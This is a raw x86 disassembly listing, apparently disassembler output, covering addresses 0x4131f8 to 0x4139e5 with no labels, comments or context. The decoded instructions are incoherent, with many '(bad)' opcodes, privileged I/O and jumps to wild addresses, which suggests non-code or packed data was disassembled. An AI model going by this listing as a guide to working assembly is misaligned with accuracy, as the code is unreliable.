  4131f8:	mov    cl,0xb1
  4131fa:	rep outs dx,DWORD PTR ds:[esi]
  4131fc:	adc    eax,0x4c700dba
  413201:	cdq    
  413202:	add    ebx,0xffffffaf
  413205:	jno    0x41320d
  413207:	xor    eax,0x37c94b82
  41320c:	mov    ebp,0x3f580bac
  413211:	rcl    BYTE PTR [edx-0x40b6e723],cl
  413217:	sbb    bl,BYTE PTR [edi+0x1d583572]
  41321d:	sub    dl,BYTE PTR [edx]
  41321f:	mov    edx,0xe2b6ae72
  413224:	leave  
  413225:	sbb    DWORD PTR [ebx],ebp
  413227:	outs   dx,BYTE PTR ds:[esi]
  413228:	inc    esp
  413229:	pop    ebp
  41322a:	mov    edx,0xb00875d8
  41322f:	sub    ah,BYTE PTR [eax+0x30]
  413232:	rcr    BYTE PTR [ecx],1
  413234:	mov    ss,WORD PTR [ecx+edi*4]
  413237:	jmp    0x986d:0xf968245e
  41323e:	jle    0x41328b
  413240:	pusha  
  413241:	rcr    DWORD PTR [edx+0x3e],cl
  413244:	adc    bh,BYTE PTR [ebx-0x60]
  413247:	aaa    
  413248:	push   DWORD PTR [ebx]
  41324a:	fnstcw WORD PTR [ebx+ebx*1-0x5be9c9a1]
  413251:	or     eax,edx
  413253:	lods   al,BYTE PTR ds:[esi]
  413254:	push   0x499f8492
  413259:	loopne 0x41324a
  41325b:	xchg   ecx,eax
  41325c:	and    dh,BYTE PTR [edi+eiz*4]
  41325f:	pop    ss
  413260:	inc    ebp
  413261:	add    al,0x2f
  413263:	sar    DWORD PTR [ebx-0x34b8bf28],0x9c
  41326a:	imul   BYTE PTR ds:0x4a449aaf
  413270:	pop    eax
  413271:	repnz push cs
  413273:	xchg   edi,eax
  413274:	and    al,0x9c
  413276:	repnz adc al,dh
  413279:	push   es
  41327a:	push   esi
  41327b:	retf   0xb8d2
  41327e:	and    DWORD PTR [ebp-0x4b39712f],0x496eba80
  413288:	jno    0x413218
  41328a:	mov    ch,0x4c
  41328c:	rol    BYTE PTR [eax-0x57],cl
  41328f:	jg     0x4132e7
  413291:	lahf   
  413292:	jl     0x413243
  413294:	jl     0x413270
  413296:	out    dx,al
  413297:	add    al,0x49
  413299:	push   edx
  41329a:	in     al,0xe2
  41329c:	xor    BYTE PTR [esi-0x21],cl
  41329f:	fild   WORD PTR [esp+ebp*4]
  4132a2:	and    cl,ah
  4132a4:	sbb    eax,0x81ed09fd
  4132a9:	loope  0x413329
  4132ab:	jp     0x4132a0
  4132ad:	inc    edi
  4132ae:	(bad)  
  4132af:	dec    eax
  4132b0:	ja     0x41326f
  4132b2:	adc    eax,0xfffffff1
  4132b5:	mov    ah,0x4e
  4132b7:	xchg   DWORD PTR [edx-0x12],esp
  4132ba:	pop    ecx
  4132bb:	cli    
  4132bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132bd:	fstp   DWORD PTR [eax+0xcbed08d]
  4132c3:	xchg   ecx,eax
  4132c4:	push   edx
  4132c5:	mov    bh,BYTE PTR [eax]
  4132c7:	inc    eax
  4132c8:	jns    0x41332b
  4132ca:	or     edi,0x5887138e
  4132d0:	in     eax,0x9d
  4132d2:	pusha  
  4132d3:	adc    al,0x5
  4132d5:	mov    ebp,ebx
  4132d7:	xor    eax,0xbffdca05
  4132dc:	push   cs
  4132dd:	push   edx
  4132de:	ret    0x46e7
  4132e1:	pop    ds
  4132e2:	dec    esp
  4132e3:	cld    
  4132e4:	cli    
  4132e5:	mov    ebx,DWORD PTR [eax+eax*2+0x59]
  4132e9:	(bad)  [edx]
  4132eb:	jmp    0xc01bd9b0
  4132f0:	xchg   ch,bh
  4132f2:	cmp    DWORD PTR [eax-0x41],0xc4d8c9da
  4132f9:	xor    DWORD PTR [ebp+0x7f3a53eb],ebx
  4132ff:	shr    BYTE PTR [edi-0x244a9d27],cl
  413305:	imul   eax,DWORD PTR [esi],0x5066eb5f
  41330b:	out    0xa2,eax
  41330d:	mov    ?,WORD PTR [esi-0x6836546]
  413313:	and    al,0x2f
  413315:	sbb    ebx,ebp
  413317:	dec    edx
  413318:	xchg   BYTE PTR [ebx-0x3c4d0478],dl
  41331e:	dec    edx
  41331f:	std    
  413320:	xor    BYTE PTR [ecx-0x3c380b0],0xc9
  413327:	xchg   ebp,eax
  413328:	in     eax,0xe3
  41332a:	mov    ah,0x19
  41332c:	in     al,dx
  41332d:	lods   al,BYTE PTR ds:[esi]
  41332e:	sbb    eax,0xfdbdae6c
  413333:	and    ebp,DWORD PTR [ebp-0x3d]
  413336:	jmp    0x413329
  413338:	pop    edx
  413339:	sbb    BYTE PTR [eax+ebp*4+0x16],bh
  41333d:	std    
  41333e:	int    0xcc
  413340:	push   0x1b589b2d
  413345:	mov    eax,ds:0x47062ead
  41334a:	xor    BYTE PTR [esi-0x1680a026],ah
  413350:	mov    eax,0xb48eb8c5
  413355:	xor    ebx,eax
  413357:	sub    al,0xde
  413359:	mov    al,0x4c
  41335b:	xlat   BYTE PTR ds:[ebx]
  41335c:	mov    bh,0x96
  41335e:	or     BYTE PTR [ecx+0x74],dh
  413361:	mov    gs,WORD PTR [ebx-0x514bd4b3]
  413367:	mov    esp,0xba8f602d
  41336c:	int    0xfd
  41336e:	add    bl,BYTE PTR [edi]
  413370:	retf   
  413371:	sbb    al,0x1
  413373:	add    al,0xb9
  413375:	or     esi,ebp
  413377:	jbe    0x413322
  413379:	mov    dl,0x62
  41337b:	dec    ebp
  41337c:	xchg   esi,eax
  41337d:	fcmovnu st,st(6)
  41337f:	xchg   edx,eax
  413380:	sub    BYTE PTR [edi-0x23],bh
  413383:	mov    ds:0x9840e357,eax
  413388:	dec    ebp
  413389:	inc    ecx
  41338a:	sbb    dh,ch
  41338c:	test   eax,0x833c1f35
  413391:	push   ebp
  413392:	jns    0x4133e9
  413394:	xchg   esi,eax
  413395:	repz adc DWORD PTR [edi-0x7dc65325],esp
  41339c:	mov    al,0x3f
  41339e:	(bad)  [ebx]
  4133a0:	mov    ebp,0x969e6abb
  4133a5:	sbb    BYTE PTR [ebx-0x8],cl
  4133a8:	inc    ebx
  4133a9:	pop    ecx
  4133aa:	sub    BYTE PTR [esi+0x437e7cda],bh
  4133b0:	push   cs
  4133b1:	int    0x89
  4133b3:	enter  0xcc1c,0x3f
  4133b7:	in     eax,dx
  4133b8:	lds    ecx,FWORD PTR [ebx]
  4133ba:	pop    ds
  4133bb:	rcr    DWORD PTR [eax-0x5a68660f],1
  4133c1:	sbb    eax,0x45ac07a4
  4133c6:	sub    eax,0x4b97a4fd
  4133cb:	shl    BYTE PTR [edi+ebp*4],1
  4133ce:	cs js  0x41343e
  4133d1:	loop   0x4133a9
  4133d3:	cmp    ebp,DWORD PTR [esi]
  4133d5:	xchg   bl,dh
  4133d7:	rol    edi,cl
  4133d9:	frstor [ebp+0x7e]
  4133dc:	lea    edx,[esi+edx*2+0x7f]
  4133e0:	popf   
  4133e1:	loop   0x413425
  4133e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133e4:	hlt    
  4133e5:	jae    0x41343a
  4133e7:	ret    0xc62
  4133ea:	lods   eax,DWORD PTR ds:[esi]
  4133eb:	mov    WORD PTR [ebp+0x232fb4bf],gs
  4133f1:	xchg   esi,eax
  4133f2:	rcr    BYTE PTR [eax-0x2f018e0d],1
  4133f8:	xchg   ebx,eax
  4133f9:	jbe    0x413415
  4133fb:	imul   ecx
  4133fd:	daa    
  4133fe:	ja     0x413380
  413400:	push   ss
  413401:	outs   dx,BYTE PTR ds:[esi]
  413402:	scas   al,BYTE PTR es:[edi]
  413403:	inc    ebx
  413404:	push   0xffffffdf
  413406:	test   eax,0x3ffd9ab
  41340b:	out    dx,al
  41340c:	cmp    cl,cl
  41340e:	(bad)  
  41340f:	mov    DWORD PTR ds:0x8bff15ba,ebp
  413415:	push   ds
  413416:	sbb    eax,0xe239760d
  41341b:	in     eax,0x14
  41341d:	arpl   WORD PTR [esp+eax*1+0x7271c751],si
  413424:	xor    al,0x94
  413426:	test   ebx,edi
  413428:	add    BYTE PTR [edx+edi*1-0x5b],ah
  41342c:	push   ebx
  41342d:	mov    dh,0x79
  41342f:	sbb    eax,0xd0182ebe
  413434:	push   ss
  413435:	mov    cl,0x83
  413437:	pop    esp
  413438:	mov    al,0xa
  41343a:	sub    dl,bh
  41343c:	push   ecx
  41343d:	or     ebx,esp
  41343f:	push   esp
  413440:	jg     0x4134a7
  413442:	aam    0x1c
  413444:	adc    eax,0xe1900c55
  413449:	idiv   BYTE PTR [edi]
  41344b:	add    al,0x52
  41344d:	mov    bh,0x1c
  41344f:	jo     0x413487
  413451:	(bad)  
  413452:	pushf  
  413453:	ds in  eax,dx
  413455:	(bad)  
  413456:	cwde   
  413457:	xchg   esi,eax
  413458:	xchg   BYTE PTR [edi-0x13d1030e],bh
  41345e:	push   esi
  41345f:	pop    ecx
  413460:	or     BYTE PTR [ebx],ch
  413462:	pop    eax
  413463:	xchg   dl,al
  413465:	ins    DWORD PTR es:[edi],dx
  413466:	cwde   
  413467:	aaa    
  413468:	xchg   BYTE PTR [edx-0x6902072f],ch
  41346e:	fcom   DWORD PTR [ebx-0x48317e8a]
  413474:	sub    edx,DWORD PTR [ecx]
  413476:	cmc    
  413477:	jg     0x41349a
  413479:	push   es
  41347a:	mov    ebx,0x49711f72
  41347f:	xor    al,0x6
  413481:	(bad)  
  413482:	(bad)  
  413483:	(bad)  
  413484:	xor    bl,BYTE PTR [ecx-0x51]
  413487:	pop    esi
  413488:	out    0x6c,al
  41348a:	and    ah,ah
  41348c:	cmp    eax,0x267da218
  413491:	in     al,0xe2
  413493:	test   DWORD PTR [ebp-0x7b],0xe38c013c
  41349a:	(bad)  
  41349b:	or     eax,0x5c7a794b
  4134a0:	repz inc ecx
  4134a2:	xchg   ebp,eax
  4134a3:	mov    eax,0x374ddf74
  4134a8:	jmp    0x41351f
  4134aa:	rcr    DWORD PTR [edi],cl
  4134ac:	inc    ebp
  4134ad:	aad    0xbe
  4134af:	test   sp,0xb88
  4134b4:	out    0x2f,eax
  4134b6:	outs   dx,DWORD PTR ds:[esi]
  4134b7:	fxch   st(2)
  4134b9:	and    eax,0x227faece
  4134be:	mov    esi,ecx
  4134c0:	add    DWORD PTR ds:0x766db578,ecx
  4134c6:	mov    ds:0x943f1dd5,al
  4134cb:	push   edx
  4134cc:	imul   edi,DWORD PTR ds:0xeb1745c9,0x54fcbfcd
  4134d6:	inc    ebp
  4134d7:	pop    ebx
  4134d8:	rcl    bh,cl
  4134da:	xor    DWORD PTR [edx+eax*4],edx
  4134dd:	cwde   
  4134de:	mov    ds:0xc2202fb1,eax
  4134e3:	push   cs
  4134e4:	sbb    BYTE PTR [ebx+0x4b53929a],dh
  4134ea:	dec    eax
  4134eb:	mov    gs,WORD PTR [ebx-0x31b1d953]
  4134f1:	jne    0x413494
  4134f3:	jae    0x413566
  4134f5:	mov    bh,0xe8
  4134f7:	out    dx,eax
  4134f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134f9:	sbb    dh,ch
  4134fb:	xchg   edx,eax
  4134fc:	aam    0x3e
  4134fe:	cmp    al,0x37
  413501:	dec    edx
  413502:	jle    0x413576
  413504:	jbe    0x41352c
  413506:	fdiv   DWORD PTR [edi+0x566722b9]
  41350c:	mov    esi,DWORD PTR [ebp+0x6]
  41350f:	data16 std 
  413511:	dec    ebx
  413512:	and    BYTE PTR [edi+0x592cc4d6],dl
  413518:	xor    BYTE PTR [edi],0xba
  41351b:	and    DWORD PTR [esi+edi*4+0xa17a05b],ecx
  413522:	scas   al,BYTE PTR es:[edi]
  413523:	outs   dx,BYTE PTR ds:[esi]
  413524:	ret    0xbf2e
  413527:	xchg   esi,eax
  413528:	into   
  413529:	cmp    ebx,DWORD PTR [ecx+ebp*8]
  41352c:	std    
  41352d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41352e:	adc    eax,0x99bab6ed
  413533:	push   ebp
  413534:	mov    WORD PTR [edx+0x4a],ds
  413537:	xchg   BYTE PTR [ebx+ebp*8+0x64c16a59],cl
  41353e:	jmp    0x413560
  413540:	push   ebp
  413541:	into   
  413542:	or     al,0xaa
  413544:	mov    ds:0x3ba32341,eax
  413549:	stc    
  41354a:	sbb    esp,DWORD PTR [edi*8+0x421796a4]
  413551:	sbb    BYTE PTR [eax],ch
  413553:	aam    0xa
  413555:	push   eax
  413556:	fsubr  DWORD PTR [eax+esi*1-0x14]
  41355a:	cmp    BYTE PTR [edx+eax*8+0x26],dl
  41355e:	pop    es
  41355f:	pop    edx
  413560:	fild   QWORD PTR [ecx-0x3c264098]
  413566:	je     0x4135b6
  413568:	in     eax,0x12
  41356a:	fsubr  QWORD PTR [ebx-0x4]
  41356d:	addr16 push 0xbcc87cf5
  413573:	pop    edi
  413574:	adc    DWORD PTR ss:[ecx+eiz*4+0x2a],esp
  413579:	fsubr  DWORD PTR [edi+0x2b]
  41357c:	aam    0x88
  41357e:	(bad)  
  41357f:	call   FWORD PTR [ebp-0x3b]
  413582:	mov    ch,0x98
  413584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413585:	aas    
  413586:	lods   al,BYTE PTR ds:[esi]
  413587:	mov    ecx,0x15a706
  41358c:	xchg   ebx,eax
  41358d:	jl     0x4135f0
  41358f:	enter  0xed40,0xd6
  413593:	and    al,0xc3
  413595:	(bad)  
  413597:	adc    al,0x95
  413599:	jge    0x413555
  41359b:	pop    ecx
  41359c:	mov    esi,0x904b40b6
  4135a1:	and    esi,DWORD PTR [ecx-0x4f]
  4135a4:	mov    al,0x49
  4135a6:	out    dx,eax
  4135a7:	cmp    bh,0x8
  4135aa:	int3   
  4135ab:	inc    ebx
  4135ac:	pop    ebp
  4135ad:	or     BYTE PTR [esi],al
  4135af:	js     0x41362c
  4135b1:	xchg   edx,eax
  4135b2:	ret    0x3590
  4135b5:	add    DWORD PTR [ebp*2-0x480268ac],ebx
  4135bc:	mov    ah,0x2b
  4135be:	lds    eax,FWORD PTR ss:[ecx-0x28fd3a2c]
  4135c5:	pusha  
  4135c6:	loop   0x41356c
  4135c8:	fpatan 
  4135ca:	mov    dh,0xb6
  4135cc:	aad    0xfd
  4135ce:	loop   0x41358b
  4135d0:	dec    esp
  4135d1:	push   es
  4135d2:	xor    cl,bh
  4135d4:	pusha  
  4135d5:	jae    0x41358b
  4135d7:	shr    esp,1
  4135d9:	xchg   DWORD PTR [ecx],edx
  4135db:	or     edi,DWORD PTR [ebx-0x30]
  4135de:	cmp    dl,BYTE PTR [esi-0x39]
  4135e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135e2:	cmp    al,0xb6
  4135e4:	mov    ecx,0xb279a26a
  4135e9:	push   ebx
  4135ea:	and    al,0x0
  4135ec:	je     0x413657
  4135ee:	(bad)  
  4135ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135f0:	sti    
  4135f1:	sub    DWORD PTR [ebx+0x59c8f667],0x5e
  4135f8:	pop    ecx
  4135f9:	rcl    ecx,0xb5
  4135fc:	ds mov ebx,0xe8c2469c
  413602:	nop
  413603:	into   
  413604:	es cli 
  413606:	inc    edx
  413607:	sbb    ebx,DWORD PTR [ecx+0x168886f0]
  41360d:	push   edx
  41360e:	cmp    DWORD PTR [eax+0x1c],0x56
  413612:	mov    esp,0x96b6655c
  413617:	xchg   ebx,eax
  413618:	rol    edi,0x99
  41361b:	and    BYTE PTR [ecx-0x1e],bh
  41361e:	pushf  
  41361f:	or     BYTE PTR [ecx+edx*1-0x3d90db34],cl
  413626:	cmp    bl,bl
  413628:	call   0x8685408b
  41362d:	in     eax,0xa7
  41362f:	lahf   
  413630:	jnp    0x413636
  413632:	(bad)  
  413633:	adc    DWORD PTR [edx],edx
  413635:	lods   eax,DWORD PTR ds:[esi]
  413636:	inc    esi
  413637:	mov    ds:0xeb7c5298,al
  41363c:	daa    
  41363d:	test   dl,bh
  41363f:	test   al,0xa4
  413641:	out    0x3f,al
  413643:	dec    esi
  413644:	mov    edx,0x2a5e603e
  413649:	ja     0x413643
  41364b:	test   eax,0x22802434
  413650:	xchg   BYTE PTR [ecx+0x5a],cl
  413653:	adc    DWORD PTR ds:0x425b6ff6,eax
  413659:	scas   eax,DWORD PTR es:[edi]
  41365a:	sub    al,0x7e
  41365c:	jmp    0xbb28:0xe724e5f0
  413663:	(bad)  ds:0x6692b691
  413669:	add    bl,BYTE PTR [ebx+0xb]
  41366c:	test   DWORD PTR [eax],ebx
  41366e:	xor    dl,BYTE PTR [eax+0x6c]
  413671:	ja     0x4136bc
  413673:	aad    0xc6
  413675:	add    al,al
  413677:	inc    edi
  413678:	jnp    0x41363c
  41367a:	jmp    0x413658
  41367c:	add    DWORD PTR [edi+0x679cb2e9],edx
  413682:	inc    eax
  413683:	retw   0x61a7
  413687:	cdq    
  413688:	xchg   edi,eax
  413689:	pusha  
  41368a:	lods   al,BYTE PTR ds:[esi]
  41368b:	mov    ebp,0x6a2bb912
  413690:	sbb    ah,BYTE PTR [esi*2+0x455a5095]
  413697:	mov    al,BYTE PTR [ebp-0x18]
  41369a:	sub    ah,BYTE PTR [esi]
  41369c:	es or  dl,dl
  41369f:	ss or  eax,0x6745ac7a
  4136a5:	xor    DWORD PTR [ebx+esi*8],edx
  4136a8:	push   ds
  4136a9:	xchg   esp,eax
  4136aa:	mov    ebx,0xd0ce958b
  4136af:	in     eax,dx
  4136b0:	mov    al,0xd9
  4136b2:	jecxz  0x413705
  4136b4:	push   ecx
  4136b5:	das    
  4136b6:	lods   al,BYTE PTR ds:[esi]
  4136b7:	cwde   
  4136b8:	add    dl,BYTE PTR ds:0x418ddf
  4136be:	mov    bh,0xc5
  4136c0:	cmp    edi,ebp
  4136c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136c4:	cli    
  4136c5:	sub    DWORD PTR [edi+0x4b],edx
  4136c8:	mov    dl,0xdf
  4136ca:	fdiv   DWORD PTR [eax+0x6c6498cb]
  4136d0:	adc    BYTE PTR ds:[eax-0x44],dh
  4136d4:	(bad)  
  4136d5:	and    al,0x1f
  4136d7:	fld    st(0)
  4136d9:	sub    DWORD PTR [ebp+0x42],ebx
  4136dc:	sti    
  4136dd:	js     0x41368c
  4136df:	es add eax,0x8641fa15
  4136e5:	mov    DWORD PTR [ecx-0x31e3ffe0],0x3d7fabe9
  4136ef:	sbb    BYTE PTR [ebx],bl
  4136f1:	loope  0x41374b
  4136f3:	dec    ebx
  4136f4:	pop    eax
  4136f5:	lahf   
  4136f6:	mov    ch,0x83
  4136f8:	mov    bh,BYTE PTR [edx-0x21e989cd]
  4136fe:	ret    0x7eb8
  413701:	fisttp QWORD PTR [edx+0xa347de5]
  413707:	mov    edx,ds
  413709:	jmp    0x413776
  41370b:	in     eax,0x65
  41370d:	fwait
  41370e:	iret   
  41370f:	daa    
  413710:	xchg   edx,eax
  413711:	not    BYTE PTR [ebp+0x66]
  413714:	pop    ds
  413715:	icebp  
  413716:	js     0x4136c5
  413718:	or     BYTE PTR ds:0x49bb3ca1,al
  41371e:	lods   al,BYTE PTR ds:[esi]
  41371f:	das    
  413720:	in     eax,0xfd
  413722:	sbb    al,0x7f
  413724:	mov    ebx,0x71f55d3c
  413729:	sub    ah,cl
  41372b:	test   al,0xd5
  41372d:	fimul  DWORD PTR ds:0x6bb0b283
  413733:	pop    eax
  413734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413735:	fsub   DWORD PTR [ebx-0xe070781]
  41373b:	jg     0x4136e6
  41373d:	inc    esi
  41373e:	dec    esp
  41373f:	icebp  
  413740:	repz jb 0x4137bb
  413743:	jle    0x41373c
  413745:	test   BYTE PTR [edi+0x6e869dfe],bh
  41374b:	cs jne 0x413778
  41374e:	sbb    esp,DWORD PTR ds:0x598f5e67
  413754:	dec    edx
  413755:	into   
  413756:	jno    0x413781
  413758:	mov    ecx,0x71b70582
  41375d:	leave  
  41375e:	lock iret 
  413760:	push   esp
  413761:	loopne 0x41376e
  413763:	ds cld 
  413765:	xchg   edi,eax
  413766:	push   esi
  413767:	aas    
  413768:	adc    al,BYTE PTR [ecx+0x4187792]
  41376e:	mov    esp,DWORD PTR [edx+0x42e7d66c]
  413774:	(bad)  
  413776:	pop    edx
  413777:	mov    ebp,0x62de726d
  41377c:	mov    eax,ds:0xe31a4fa0
  413781:	and    eax,0xe583278b
  413786:	jne    0x413761
  413788:	sbb    eax,0xc60f7bbc
  41378d:	sbb    dh,BYTE PTR [esi-0x2363c196]
  413793:	pop    edi
  413794:	inc    edx
  413795:	adc    ah,bh
  413797:	je     0x41372d
  413799:	xchg   edi,eax
  41379a:	ror    DWORD PTR [ebp+0x4da689da],0x64
  4137a1:	xchg   esi,eax
  4137a2:	icebp  
  4137a3:	jns    0x413757
  4137a5:	adc    dl,BYTE PTR fs:[edx+ebx*1+0x62018193]
  4137ad:	cld    
  4137ae:	arpl   WORD PTR [ecx+ebp*8-0x12],bp
  4137b2:	cdq    
  4137b3:	test   eax,0x6e297148
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	pop    esi
  4137ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137bb:	push   0x64ef213f
  4137c0:	adc    DWORD PTR ds:0xbe6ef706,eax
  4137c6:	jo     0x4137fa
  4137c8:	data16 (bad) 
  4137cb:	jo     0x413832
  4137cd:	in     eax,dx
  4137ce:	xor    ch,BYTE PTR [edi]
  4137d0:	jbe    0x4137cb
  4137d2:	sub    BYTE PTR [esi],0x3f
  4137d5:	and    eax,0x9f278a2a
  4137da:	out    0x4c,eax
  4137dc:	cmp    ah,BYTE PTR [edi-0x1c]
  4137df:	dec    edx
  4137e0:	je     0x413805
  4137e2:	mov    ds:0xa45d6346,al
  4137e7:	dec    edi
  4137e8:	inc    edx
  4137e9:	sar    DWORD PTR [ebx+esi*4-0x52],1
  4137ed:	fcmovb st,st(4)
  4137ef:	push   ss
  4137f0:	xchg   ebp,eax
  4137f1:	pushf  
  4137f2:	je     0x41381d
  4137f4:	addr16 aaa 
  4137f6:	(bad)  
  4137f7:	arpl   cx,dx
  4137f9:	ja     0x413856
  4137fb:	imul   eax,DWORD PTR [ebp+0x68],0x34
  4137ff:	out    0xc8,eax
  413801:	sbb    al,0xec
  413803:	repz and DWORD PTR [eax-0xe],ebx
  413807:	aad    0x62
  413809:	(bad)
  41380d:	jne    0x4137b5
  41380f:	add    dl,BYTE PTR [edi+0x2c]
  413812:	mov    WORD PTR ds:0xf61ac2ac,ds
  413818:	popf   
  413819:	jne    0x413839
  41381b:	mov    al,ds:0xc2ce4360
  413820:	push   edi
  413821:	iret   
  413822:	jmp    0x8a992154
  413827:	outs   dx,DWORD PTR ds:[esi]
  413828:	or     edx,DWORD PTR [eax+0x2a]
  41382b:	mov    edi,0x59b8f085
  413830:	xor    dl,BYTE PTR [edi+0x54521d05]
  413836:	int3   
  413837:	add    eax,DWORD PTR gs:[ecx+0x3edcb0e0]
  41383e:	int3   
  41383f:	inc    ebp
  413840:	ret    
  413841:	mov    ecx,0xc20d7db1
  413846:	or     edx,esi
  413848:	mov    dl,0x4d
  41384a:	(bad)  
  41384b:	(bad)  
  41384c:	je     0x4137ed
  41384e:	in     eax,dx
  41384f:	fcmovne st,st(7)
  413851:	adc    al,0x29
  413853:	retf   0x546e
  413856:	mov    bl,0x23
  413858:	popa   
  413859:	in     al,dx
  41385a:	test   al,0x7d
  41385c:	add    BYTE PTR [esi-0x569de7f7],dl
  413862:	jge    0x413866
  413864:	in     eax,dx
  413865:	mov    esp,0xd6e8b202
  41386a:	jge    0x41389e
  41386c:	cli    
  41386d:	pop    ss
  41386e:	popf   
  41386f:	stc    
  413870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413871:	jmp    0x4138d8
  413873:	out    0x2c,eax
  413875:	ins    BYTE PTR es:[edi],dx
  413876:	xchg   ecx,eax
  413877:	lods   eax,DWORD PTR ds:[esi]
  413878:	retf   
  413879:	daa    
  41387a:	mov    bl,0x83
  41387c:	clc    
  41387d:	fild   QWORD PTR [ecx+0x71]
  413880:	and    BYTE PTR [edx],bl
  413882:	push   ebx
  413883:	jmp    0x4fbc27dc
  413888:	cwde   
  413889:	outs   dx,BYTE PTR ds:[esi]
  41388a:	cwde   
  41388b:	mov    ah,0xbd
  41388d:	jns    0x413842
  41388f:	inc    esp
  413890:	sti    
  413891:	jg     0x4138aa
  413893:	mov    eax,ds:0x2cd08ab5
  413898:	or     DWORD PTR [eax+ecx*2],ebx
  41389b:	jae    0x413912
  41389d:	ins    BYTE PTR es:[edi],dx
  41389e:	fidivr WORD PTR [esi]
  4138a0:	mov    bh,0xe0
  4138a2:	pop    ebp
  4138a3:	ret    0xbf99
  4138a6:	inc    edx
  4138a7:	(bad)  
  4138a8:	(bad)  
  4138a9:	fsubr  QWORD PTR [eax]
  4138ab:	repnz xor BYTE PTR [edi+0x608529ad],0x4a
  4138b3:	and    cl,0x1a
  4138b6:	sti    
  4138b7:	cwde   
  4138b8:	add    al,BYTE PTR [ebp+0x64]
  4138bb:	mov    cl,0xe
  4138bd:	les    edx,FWORD PTR ds:0x5981b76c
  4138c3:	lods   eax,DWORD PTR ds:[esi]
  4138c4:	test   eax,0x3d4d956a
  4138c9:	into   
  4138ca:	xor    eax,DWORD PTR [esi-0x25]
  4138cd:	dec    esp
  4138ce:	add    dh,BYTE PTR [edx+0x7725aa08]
  4138d4:	push   esi
  4138d5:	pop    ebp
  4138d6:	bnd jae 0x413899
  4138d9:	cmp    al,0x13
  4138db:	sbb    esi,DWORD PTR [esi+0x3cd4b531]
  4138e1:	xor    eax,0x96f28506
  4138e6:	loop   0x4138fd
  4138e8:	mov    edi,0x2e723e56
  4138ed:	or     ch,cl
  4138ef:	in     eax,dx
  4138f0:	sbb    DWORD PTR [ecx],0xffffff81
  4138f3:	sbb    eax,0x4564d800
  4138f8:	or     eax,0x329b54d8
  4138fd:	jno    0x4138b3
  4138ff:	mov    dl,0x46
  413901:	cmp    al,0x80
  413903:	rol    BYTE PTR ds:0x9a03550c,cl
  413909:	add    ch,BYTE PTR [ecx+0xd45662b]
  41390f:	retf   
  413910:	inc    ebp
  413911:	mov    ah,0xc5
  413913:	adc    cl,BYTE PTR [ebp+0x26e0f6da]
  413919:	mov    fs,WORD PTR [eax]
  41391b:	int    0x6a
  41391d:	xlat   BYTE PTR ds:[ebx]
  41391e:	mov    ebx,0x3a71450e
  413923:	jmp    0x3c49c0a5
  413928:	ja     0x4138ef
  41392a:	popf   
  41392b:	push   ecx
  41392c:	scas   al,BYTE PTR es:[edi]
  41392d:	sbb    al,0xd4
  41392f:	mov    dh,0x53
  413931:	fadd   st,st(0)
  413933:	jge    0x41391a
  413935:	add    DWORD PTR [edx+edx*8],ebp
  413938:	cld    
  413939:	out    dx,eax
  41393a:	aaa    
  41393b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41393c:	jo     0x413988
  41393e:	in     eax,0x63
  413940:	sub    al,0x5f
  413942:	cmp    edi,DWORD PTR [ecx]
  413944:	or     eax,edx
  413946:	clc    
  413947:	cdq    
  413948:	add    BYTE PTR [esi-0x41],al
  41394b:	sub    cl,BYTE PTR [edi-0x77706660]
  413951:	ins    BYTE PTR es:[edi],dx
  413952:	pop    edi
  413953:	retf   
  413954:	ins    BYTE PTR es:[edi],dx
  413955:	ret    
  413956:	adc    al,0x11
  413958:	(bad)  
  413959:	mov    ebx,gs
  41395b:	pop    ecx
  41395c:	xchg   esp,eax
  41395d:	repz xor DWORD PTR [esi-0x58],esp
  413961:	pusha  
  413962:	xor    al,0xb0
  413964:	mov    al,BYTE PTR [edi-0x13]
  413967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413968:	lock imul DWORD PTR [edx]
  41396b:	cmp    DWORD PTR [ecx+ecx*2-0x5255d919],0x6f
  413973:	push   0x7ecb4341
  413978:	fdivr  QWORD PTR [esi-0x6f]
  41397b:	mov    ss,WORD PTR [esi]
  41397d:	lea    ebx,ds:[ebx]
  413980:	jno    0x41397c
  413982:	xor    edx,esi
  413984:	mov    eax,ds:0xc7fc4e2e
  413989:	(bad)  
  41398a:	in     al,dx
  41398b:	mov    edi,0xcab6977b
  413990:	repz into 
  413992:	pop    ebx
  413993:	push   es
  413994:	or     al,0xf7
  413996:	stos   DWORD PTR es:[edi],eax
  413997:	pop    es
  413998:	adc    DWORD PTR [ecx-0x37ebee18],ebx
  41399e:	push   ss
  41399f:	and    al,0xb
  4139a1:	xor    BYTE PTR [eax],0xf9
  4139a4:	push   eax
  4139a5:	aad    0xa0
  4139a7:	adc    DWORD PTR [edx+0x7e],eax
  4139aa:	mov    esi,0x9a992727
  4139af:	sbb    ch,al
  4139b1:	xor    DWORD PTR [eax+0x63],ecx
  4139b4:	mov    cs,WORD PTR [edi-0x708ff786]
  4139ba:	mov    al,0xd6
  4139bc:	sub    DWORD PTR [esi+0x63],esp
  4139bf:	sub    edi,DWORD PTR [ecx]
  4139c1:	sbb    DWORD PTR [esi-0x1249bf16],ebp
  4139c7:	push   eax
  4139c8:	adc    DWORD PTR [edx+0x7f3bc0b9],ebp
  4139ce:	loop   0x413a37
  4139d0:	mov    dl,0x1
  4139d2:	into   
  4139d3:	lods   al,BYTE PTR ds:[esi]
  4139d4:	cmp    BYTE PTR [ebx-0x6f],0x80
  4139d8:	push   ds
  4139d9:	xor    BYTE PTR [eax],cl
  4139db:	mov    bl,0x9a
  4139dd:	jne    0x413a43
  4139df:	add    eax,0x27cf552a
  4139e4:	aaa    
  4139e5:	mov    ds:0x3db2b39a,eax
